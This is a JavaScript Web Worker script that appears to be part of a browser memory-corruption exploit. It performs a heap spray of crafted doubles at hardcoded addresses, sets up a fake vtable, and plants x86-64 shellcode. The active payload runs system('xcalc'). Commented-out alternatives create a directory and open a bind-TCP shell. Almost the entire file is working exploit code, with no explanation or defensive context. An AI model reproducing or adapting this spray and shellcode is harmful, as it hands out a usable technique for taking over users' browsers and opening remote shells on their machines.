self.onmessage = function(msg) {
	var conv = new ArrayBuffer(8);
	var convf64 = new Float64Array(conv);
	var convu32 = new Uint32Array(conv);

	var qword2Double = function(a, b){
		convu32[0] = b;
		convu32[1] = a;
		return convf64[0];
	}

	var doubldFromFloat = function(b, a){
		convf64[0] = b;
		return convu32[a];
	}

	var vtable_offset = 308; // to work

	var spr = Array(400);

	var arrBase = 0x7fffb0000010;
	var ropArrBuf = new ArrayBuffer(4096);
	var fzero = qword2Double(0x43434343, 0x43434343);
	var spr = Array(0x400);
	var smallspr = Array(0x4000000);
	var regionsize = 0x3;
	var memory = new Uint32Array(0x20);
	memory[0] = 0xcafebabe;
	memory[1] = 0xdeadbeef;
	memory[2] = 0xcafebabf;
	memory[3] = 0xdeadbef0;
	sprayArrays = function() {
		for(var b=Array(0x3fffa), a=0; a<0x3fffa; a++)
		{
			b[a] = fzero;
		}
		
		b[0] = qword2Double(0x7fff, 0xb0001000);  //0x7fff c0000010
		b[2] = qword2Double(0xdeadbeef, 0x42424242);
		
		b[(0x7fffb00000e8-arrBase)/8] = qword2Double(1,1);
		b[(0x7fffb01000e8-arrBase)/8] = qword2Double(1, 1);

		b[(0x7fffb0000098-arrBase)/8] = qword2Double(0x7fff, 0xb0003000);
		b[(0x7fffb0001030-arrBase)/8] = qword2Double(0, 0x4);
		b[(0x7fffb0001028-arrBase)/8] = qword2Double(0, 0);
		b[(0x7fffb0001000-arrBase)/8] = qword2Double(0x7fff, 0xb0002000);
		b[(0x7fffb0002298-arrBase)/8] = qword2Double(0x7fff, 0xe81c277c);
		

		b[(0x7fffb0100098-arrBase)/8] = qword2Double(0x7fff, 0xb0003000);
		b[(0x7fffb0100010-arrBase)/8] = qword2Double(0x7fff, 0xb0001000);
		b[(0x7fffb0101030-arrBase)/8] = qword2Double(0, 0x4);
		b[(0x7fffb0101028-arrBase)/8] = qword2Double(0, 0);
		b[(0x7fffb0101000-arrBase)/8] = qword2Double(0x7fff, 0xb0002000);
		b[(0x7fffb0102298-arrBase)/8] = qword2Double(0x7fff, 0xe81c277c);

		//vtable injection
		b[(0x7fffb0003000-arrBase)/8] = qword2Double(0x7fff, 0xb0004000);
		b[(0x7fffb0004010-arrBase)/8] = qword2Double(0x7fff, 0xe8282680);
		b[(0x7fffb0003098-arrBase)/8] = qword2Double(0x7fff, 0xb0005000);
		b[(0x7fffb0005000-arrBase)/8] = qword2Double(0x7fff, 0xb0006000);
		b[(0x7fffb00060d0-arrBase)/8] = qword2Double(0x7fff, 0xb0006200);
		b[(0x7fffb0004018-arrBase)/8] = qword2Double(0x7fff, 0xe80499c2);
		b[(0x7fffb0003050-arrBase)/8] = qword2Double(0x7fff, 0xb0006000);
		b[(0x7fffb0006000-arrBase)/8] = qword2Double(0x7fff, 0xb0007000);
		b[(0x7fffb0007018-arrBase)/8] = qword2Double(0x7fff, 0xea1c5c60);

		b[(0x7fffb0103000-arrBase)/8] = qword2Double(0x7fff, 0xb0004000);
		b[(0x7fffb0104010-arrBase)/8] = qword2Double(0x7fff, 0xe8282680);
		b[(0x7fffb0103098-arrBase)/8] = qword2Double(0x7fff, 0xb0005000);
		b[(0x7fffb0105000-arrBase)/8] = qword2Double(0x7fff, 0xb0006000);
		b[(0x7fffb01060d0-arrBase)/8] = qword2Double(0x7fff, 0xb0006200);
		b[(0x7fffb0104018-arrBase)/8] = qword2Double(0x7fff, 0xe80499c2);
		b[(0x7fffb0103050-arrBase)/8] = qword2Double(0x7fff, 0xb0006000);
		b[(0x7fffb0106000-arrBase)/8] = qword2Double(0x7fff, 0xb0007000);
		b[(0x7fffb0107018-arrBase)/8] = qword2Double(0x7fff, 0xea1c5c60);

		//string "xcalc"
		b[(0x7fffb0008000-arrBase)/8] = qword2Double(0x63, 0x6c616378);
		b[(0x7fffb0108000-arrBase)/8] = qword2Double(0x63, 0x6c616378);


		//shellcode
		//mkdir /home/dango/pwn
		/*b[(0x7fffb0006200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);

		b[(0x7fffb0006280-arrBase)/8] = qword2Double(0x622fbb48,0x99583b6a);
		b[(0x7fffb0006288-arrBase)/8] = qword2Double(0x48530068,0x732f6e69);
		b[(0x7fffb0006290-arrBase)/8] = qword2Double(0x48000063,0x2d68e789);
		b[(0x7fffb0006298-arrBase)/8] = qword2Double(0x00000016,0xe852e689);
		b[(0x7fffb00062a0-arrBase)/8] = qword2Double(0x682f2072,0x69646b6d);
		b[(0x7fffb00062a8-arrBase)/8] = qword2Double(0x676e6164,0x2f656d6f);
		b[(0x7fffb00062b0-arrBase)/8] = qword2Double(0x5756006e,0x77702f6f);
		b[(0x7fffb00062b8-arrBase)/8] = qword2Double(0x90909005,0x0fe68948);

		b[(0x7fffb0106200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);

		b[(0x7fffb0106280-arrBase)/8] = qword2Double(0x622fbb48,0x99583b6a);
    b[(0x7fffb0106288-arrBase)/8] = qword2Double(0x48530068,0x732f6e69);
    b[(0x7fffb0106290-arrBase)/8] = qword2Double(0x48000063,0x2d68e789);
    b[(0x7fffb0106298-arrBase)/8] = qword2Double(0x00000016,0xe852e689);
    b[(0x7fffb01062a0-arrBase)/8] = qword2Double(0x682f2072,0x69646b6d);
    b[(0x7fffb01062a8-arrBase)/8] = qword2Double(0x676e6164,0x2f656d6f);
    b[(0x7fffb01062b0-arrBase)/8] = qword2Double(0x5756006e,0x77702f6f);
    b[(0x7fffb01062b8-arrBase)/8] = qword2Double(0x90909005,0x0fe68948);*/
		
		//bind tcp
		/*b[(0x7fffb0006200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);

		b[(0x7fffb0006280-arrBase)/8] = qword2Double(0x6a5f026a,0x9958296a);
		b[(0x7fffb0006288-arrBase)/8] = qword2Double(0xc7529748,0x050f5e01);
		b[(0x7fffb0006290-arrBase)/8] = qword2Double(0x89485c11,0x00022404);
		b[(0x7fffb0006298-arrBase)/8] = qword2Double(0x0f58316a,0x5a106ae6);
		b[(0x7fffb00062a0-arrBase)/8] = qword2Double(0x48050f58,0x326a5905);
		b[(0x7fffb00062a8-arrBase)/8] = qword2Double(0x5650050f,0x582b6a96);
		b[(0x7fffb00062b0-arrBase)/8] = qword2Double(0x4810b699,0x58096a5f);
		b[(0x7fffb00062b8-arrBase)/8] = qword2Double(0x41226ac9,0x314dd689);
    b[(0x7fffb00062c0-arrBase)/8] = qword2Double(0x48964805,0x0f07b25a);
    b[(0x7fffb00062c8-arrBase)/8] = qword2Double(0x9090e6ff,0x050f5f97);

		b[(0x7fffb0106200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);

		b[(0x7fffb0106280-arrBase)/8] = qword2Double(0x6a5f026a,0x9958296a);
    b[(0x7fffb0106288-arrBase)/8] = qword2Double(0xc7529748,0x050f5e01);
    b[(0x7fffb0106290-arrBase)/8] = qword2Double(0x89485c11,0x00022404);
    b[(0x7fffb0106298-arrBase)/8] = qword2Double(0x0f58316a,0x5a106ae6);
    b[(0x7fffb01062a0-arrBase)/8] = qword2Double(0x48050f58,0x326a5905);
    b[(0x7fffb01062a8-arrBase)/8] = qword2Double(0x5650050f,0x582b6a96);
    b[(0x7fffb01062b0-arrBase)/8] = qword2Double(0x4810b699,0x58096a5f);
    b[(0x7fffb01062b8-arrBase)/8] = qword2Double(0x41226ac9,0x314dd689);
    b[(0x7fffb01062c0-arrBase)/8] = qword2Double(0x48964805,0x0f07b25a);
    b[(0x7fffb01062c8-arrBase)/8] = qword2Double(0x9090e6ff,0x050f5f97);*/
		
		
		//system("xcalc")
		b[(0x7fffb0006200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);

		b[(0x7fffb0006280-arrBase)/8] = qword2Double(0xb0008000,0xbf489090);
		b[(0x7fffb0006288-arrBase)/8] = qword2Double(0x5370b848,0x00007fff);
		b[(0x7fffb0006290-arrBase)/8] = qword2Double(0xe0ff0000,0x7fffe6d1);
	
		
		b[(0x7fffb0106200-arrBase)/8] = qword2Double(0x7eeb7eeb,0x7eeb7eeb);
    b[(0x7fffb0106280-arrBase)/8] = qword2Double(0xb0008000,0xbf489090);
    b[(0x7fffb0106288-arrBase)/8] = qword2Double(0x5370b848,0x00007fff);
    b[(0x7fffb0106290-arrBase)/8] = qword2Double(0xe0ff0000,0x7fffe6d1);


		b[1] = memory;
		for(a=0; a<spr.length; a++){
			spr[a] = b.slice(0);
		}
	}

	Math.asin(1);
	memory[0] = 0x41414141;
	var len = memory.length;
	var arr_index = 0;
	var arr_offset = 0;
	sprayArrays();
	postMessage(arrBase);

	postMessage("GO");
};
